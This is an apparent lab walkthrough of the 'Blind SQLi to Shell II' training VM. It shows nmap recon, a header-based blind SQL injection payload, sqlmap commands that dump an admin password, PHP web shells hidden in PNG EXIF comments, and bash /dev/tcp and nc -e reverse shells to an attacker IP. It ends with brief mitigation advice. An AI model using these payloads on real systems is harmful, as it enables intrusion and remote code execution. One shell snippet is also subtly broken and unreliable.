# Blind SQLi to Shell II
## _Walkthrough_

The first thing to do is to deploy the iso, I used VMWare, and get the ip (using the command __ifconfig__).



![image](https://user-images.githubusercontent.com/38219437/138444044-8bb3effe-29b2-486c-bc0d-4dc96f89407a.png)


## Recon

### Tecnologies used:

```
$ nmap -sC -sV 192.168.77.128 -p-

-sV check services and versions
-sC script scan
```
  **Output:**
```
80/tcp open  http    nginx 0.7.67
|_http-server-header: nginx/0.7.67
|_http-title: My Photoblog - latest picture

```
```
$ echo -en "GET / HTTP/1.1\r\nHost: 192.168.77.128\r\nConnection: close\r\n\r\n" | netcat 192.168.77.128 80

HTTP/1.1 200 OK
Server: nginx/0.7.67
Date: Thu, 21 Oct 2021 13:40:51 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.3.3-7+squeeze15
Content-Length: 1347
```
### Technologies Used


##### NGINX 0.7.67
##### PHP/5.3.3-7+squeeze15


## Attack method

### Blind SQLi

**Manually**

```
X-Forwarded-For:  sqli' or sleep(0) and '0'='0
```

**Using SQLMap**

I use this website to learn more about the different uses of **sqlmap**:
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

**SQLMap arguments I tried:**
```
$ sqlmap -u "http://192.168.77.128/cat.php?id=*" -p id

$ sqlmap -u "http://192.168.77.128/" --headers "referer:*"

$ sqlmap -u "http://192.168.77.128/" --headers "x-forwarded-for:*"
```

**SQLMAP to find the number of databases and it's names**

```
$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all

[*] information_schema
[*] photoblog

$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --tables -D photoblog


Database: photoblog

1. Tables: 4
2. Names: categories, pictures, stats, users

Table: users


$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" -D photoblog -T users --dump

Database: photoblog
Table: users
[1 entry]
+----+-------+---------------------------------------------+
| id | login | password                                    |
+----+-------+---------------------------------------------+
| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+----+-------+---------------------------------------------+
```
**Now that we have the username and the password, we can log in as admin.**

![image](https://user-images.githubusercontent.com/38219437/138444198-b7ffc49e-1a2a-4bee-a545-b7538b5352ec.png)

**After some recon we can note only one point to explore, and gain a reverse shell: upload images feature.**

## Blind SLQi Mitigation

As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.
Use parametrized queries. Do not concatenate strings in your queries.


![image](https://user-images.githubusercontent.com/38219437/138444141-db3947ae-5757-4e5c-bfbb-19f0aeca7db2.png)

### Upload png file with PHP backdoor

**Things I try without success:**
1. Just uploading a .php file instead of jpg file
2. Tried Case sensitives ??? pic.PhP also tried pic.php5, pHP5.
3. Bypass uploads rules by intercepting the request and change the content-type to __image/jpeg__ 
(https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)

4. Trying double extensions to bypass and upload php file image.jpg.php or image.php.jpg

## Final method

Most of the php web applications use the gd library to resize images. If so, the exif data will be excluded for the image. Fortunately, it was not the case! 

**First we create a php file with a php backdoor inside it:**

```
<?php $cmd=$_GET['c']; system($c); ?>
``` 
or
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.19.178.103/2222 0>&1'");?>.
```
or 
```
<?php

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Explanation of the code:

1. First the code checks if there's a **c** parameter in the url;
2. Assigns the content of the parameter **c** to the variable **c**
3. System() is for executing a system command on the server.



**Using exiftool we are going to add a comment with our payload o the image**

```
exiftool "-comment<=file.php" tux.png
```

We are now ready to upload our __image__ and generate a reverse shell.


## Now you can upload the file. After the upload you can trigger the backdoor usin this for the first two:

```
(...).png/c.php
```
### And this one for the third:

```
(...).png/c.php?c=ls
```

__We need to add cmd.php, otherwise the photo is displayed instead of the code we want__

To create a reverse shell we use the following code instead of __ls__:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional

Attackers machine:
```
$ nc -lvp 1234
```

Command c=
```
nc -e /bin/sh <attacker_ip> <nc_listener_port>
```
